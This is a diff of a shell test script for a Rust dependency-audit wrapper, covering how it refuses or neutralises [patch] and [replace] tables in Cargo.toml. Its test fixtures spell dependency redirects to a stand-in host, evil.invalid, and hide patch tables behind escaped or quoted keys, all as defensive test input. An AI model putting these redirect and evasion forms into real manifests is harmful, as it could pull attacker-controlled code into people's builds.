@@ -708,7 +708,7 @@ printf '[package]\nname = "out"\nversion = "0.1.0"\nedition = "2021"\n\n[lib]\np
 run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
 check "a target path outside the manifest's directory: exit 3, cargo never runs" \
   sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: stubs/Cargo.toml names a target outside its directory: ../../outside.rs' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
-# S1: a [patch]/[replace] table in every spelling is refused by the second-line backstop, before cargo runs.
+# A [patch]/[replace] table spelled as no Cargo.toml needs is refused by the second line, before cargo runs.
 # Each form is placed before [package], so a header form defines a top-level [patch]/[replace] table and a
 # root key is a genuine top-level key (after [package] a dotted patch key would belong to [package]).
 while IFS='|' read -r form rest; do
@@ -718,10 +718,9 @@ while IFS='|' read -r form rest; do
   run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
   label=$(printf '%s' "$form" | cut -c1-36)
   check "a [patch]/[replace] table as '$label': exit 3, cargo never runs, nothing disclosed" sh -c "
-    [ '$RC' = 3 ] && grep -qE '^deps: blocker: stubs/Cargo.toml (holds a |sets a root |has a table header with a |has a key before its first table header)' '$T/err' &&
+    [ '$RC' = 3 ] && grep -qE '^deps: blocker: stubs/Cargo.toml (holds an array of |spells a .patch. or .replace. table header with a quoted key|has a .patch. or .replace. table header deps.sh does not read|sets a root |has a table header with a |has a key before its first table header)' '$T/err' &&
     ! grep -q '^== cargo' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
 done <<'FORMS'
-[patch.crates-io]|serde = { version = "1", registry-index = "sparse+https://evil.invalid/" }
 ["patch".crates-io]|serde = { git = "https://evil.invalid/serde" }
 ['patch'.crates-io]|serde = {}
 [ "replace" ]|"serde:1.0.0" = { path = "/tmp" }
@@ -733,6 +732,8 @@ patch = { crates-io = { serde = { git = "https://evil.invalid/x" } } }|
 ["\U00000072eplace"]|"serde:1.0.0" = { path = "/tmp" }
 [[patch.crates-io]]|name = "serde"
 "\u0070atch".crates-io.serde = { git = "https://evil.invalid/x" }|
+[patch]|crates-io.serde = { git = "https://evil.invalid/x" }
+[patch.crates-io.serde.extra]|x = 1
 FORMS
 # A multi-line string before the first table header can hide a root key from a line scan (cargo reads the
 # patch below as a root key); the second line refuses anything there but comments and cargo-features.
@@ -746,6 +747,48 @@ check "a root key hidden after a multi-line string: exit 3, cargo never runs, no
 printf 'cargo-features = ["edition2024"]\n[package]\nname = "cf"\nversion = "0.1.0"\nedition = "2021"\n' > "$WT/stubs/Cargo.toml"
 run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
 check "a manifest starting with cargo-features = [\"edition2024\"] runs" sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls'"
+# A plainly spelled [patch] or [replace] table runs: the rebuilt tree leaves it out, and one note, on stderr
+# and in the kept output, names the crates it patches (names that match the crate grammar, at most 20), never
+# a value. The vendoring idiom first, with its lockfile (a path package has no source line).
+mkdir -p "$WT/pv/vendor/solana-program"
+printf '[package]\nname = "pv"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nsolana-program = "1.18"\n\n[patch.crates-io]\nsolana-program = { path = "vendor/solana-program" }\n' > "$WT/pv/Cargo.toml"
+printf '[package]\nname = "solana-program"\nversion = "1.18.26"\nedition = "2021"\n' > "$WT/pv/vendor/solana-program/Cargo.toml"
+printf 'version = 3\n\n[[package]]\nname = "pv"\nversion = "0.1.0"\ndependencies = ["solana-program"]\n\n[[package]]\nname = "solana-program"\nversion = "1.18.26"\n' > "$WT/pv/Cargo.lock"
+NOTE_PV='>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: solana-program'
+settings SHIM_DUMP=1
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml --manifest pv/Cargo.lock
+headers > "$T/hdrs"
+kept=$(sed -n 's/^>> cargo-tree: .*: \(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out")
+check "the vendoring idiom ([patch.crates-io] with a path) runs on the rebuilt manifest, exit 0" sh -c "
+  [ '$RC' = 0 ] && grep -qE '^cargo tree --workspace --color never --manifest-path $S/rebuilt/.*Cargo.toml\$' '$T/hdrs' &&
+  ! grep -qiE 'rebuilt[|].*(patch|vendor)' '$T/calls'"
+check "... with one note on stderr, and the same note in the kept output" sh -c "
+  [ \"\$(cat '$T/err')\" = '$NOTE_PV' ] && [ -n '$kept' ] && grep -qxF '$NOTE_PV' '$WT/$kept'"
+# git and registry-index entries, and the URL-keyed and [replace] forms: they run, the note names the crates,
+# and no value reaches the note or the rebuilt manifest cargo runs on.
+printf '[package]\nname = "pg"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nanyhow = "1"\n\n[patch.crates-io]\nserde = { git = "https://evil.invalid/serde" }\nanyhow = { version = "1", registry-index = "sparse+https://evil.invalid/" }\n\n[patch."https://evil.invalid/git-source"]\nlibc = { path = "evil-path" }\n\n[replace]\n"rand:0.8.5" = { git = "https://evil.invalid/rand" }\n' > "$WT/pv/Cargo.toml"
+r0=$(rows)
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
+kept=$(sed -n 's/^>> cargo-tree: .*: \(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out")
+check "[patch] entries with git and registry-index, a URL-keyed [patch] and [replace] run, exit 0, cargo told of nothing but crates.io" sh -c "
+  [ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls' && ! grep -qiE 'rebuilt[|].*(evil|patch|replace)' '$T/calls' &&
+  [ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	crates.io	'"
+check "... and the note names serde, anyhow, libc and rand, but no path, URL or registry" sh -c "
+  [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: serde, anyhow, libc, rand' ] &&
+  grep -qxF '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: serde, anyhow, libc, rand' '$WT/$kept' &&
+  ! grep -qE 'evil|https|path' '$T/err'"
+# A name outside the crate grammar is never printed, and past 20 names the note says how many more.
+{ printf '[package]\nname = "pn"\nversion = "0.1.0"\nedition = "2021"\n\n[patch.crates-io]\n"bad name" = { path = "secret-dir/one" }\n"9lead" = { path = "secret-dir/two" }\n'
+  i=1; while [ "$i" -le 22 ]; do printf 'c%s = { path = "p" }\n' "$i"; i=$((i + 1)); done; } > "$WT/pv/Cargo.toml"
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
+check "a name outside the crate grammar is not printed, and past 20 names the note counts the rest" sh -c "
+  [ '$RC' = 0 ] && [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19, c20 and 4 more' ] &&
+  ! grep -qE 'bad name|9lead|secret-dir' '$T/err'"
+printf '[package]\nname = "pn"\nversion = "0.1.0"\nedition = "2021"\n\n[patch.crates-io]\n"bad name" = { path = "secret-dir/one" }\n' > "$WT/pv/Cargo.toml"
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
+check "... and with no printable name the note only counts the entries" sh -c "
+  [ '$RC' = 0 ] && [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: 1 entry whose name is not printed' ]"
+settings
 # What the second line must not refuse: a byte-order mark, a comment and a one-line cargo-features before the
 # first header, a cfg target header with escaped quotes, and dependency keys named, or escaped to, patch.
 printf '\357\273\277# a comment\n\ncargo-features = ["edition2024"]\n[package]\nname = "ok"\nversion = "0.1.0"\nedition = "2021"\n[target."cfg(target_os = \\"linux\\")".dependencies]\nlibc = "0.2"\n[dependencies]\npatch = "1.0"\n"\\u0070atch2" = "1"\n' > "$WT/stubs/Cargo.toml"
@@ -1054,6 +1097,19 @@ if on_real_path cargo && on_real_path rustup; then
   run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-tree --run audit_1 --manifest Cargo.toml --manifest Cargo.lock
   check "real cargo tree on the copied manifests: exit 0, the package and its stub" \
     sh -c "[ '$RC' = 0 ] && grep -q '^realpkg v0.1.0' \"$RW/\$(sed -n 's/.*: \\(audit_1\\/deps\\/cargo-tree-[0-9]*[.]txt\\)\$/\\1/p' '$T/out')\""
+  # A [patch] with git and registry-index entries runs through the rebuild, and cargo tries crates.io only:
+  # every proxy variable points at a closed local port, so nothing leaves the machine, and cargo names in its
+  # output each host it tries.
+  mkdir -p "$RW/rp"
+  printf '[package]\nname = "rp"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nanyhow = "1"\n\n[patch.crates-io]\nanyhow = { version = "1", registry-index = "sparse+https://evil.invalid/" }\nserde = { git = "https://evil.invalid/serde" }\n' > "$RW/rp/Cargo.toml"
+  CLOSED=http://127.0.0.1:9
+  run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" HTTPS_PROXY="$CLOSED" HTTP_PROXY="$CLOSED" ALL_PROXY="$CLOSED" \
+    https_proxy="$CLOSED" http_proxy="$CLOSED" all_proxy="$CLOSED" AUDITOR_RUN_TIMEOUT=120 -- cargo-tree --run audit_1 --manifest rp/Cargo.toml
+  kept=$(sed -n 's/.*\(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out" "$T/err" | sed -n 1p)
+  check "real cargo: a [patch] with git and registry-index entries tries crates.io only, never a host it names" sh -c "
+    { [ '$RC' = 0 ] || [ '$RC' = 3 ]; } && [ -n '$kept' ] && grep -q 'crates.io' '$RW/$kept' &&
+    ! grep -q evil '$RW/$kept' '$T/out' '$T/err' &&
+    grep -qxF '>> note: rp/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: anyhow, serde' '$T/err'"
   if on_real_path cargo-audit && [ -d "${CARGO_HOME:-$REAL_HOME/.cargo}/advisory-db" ]; then
     run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-audit --run audit_1 --manifest Cargo.lock --no-fetch
     check "real cargo audit --no-fetch against the database in CARGO_HOME: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> cargo-audit: no vulnerability found (exit 0)' '$T/out'"
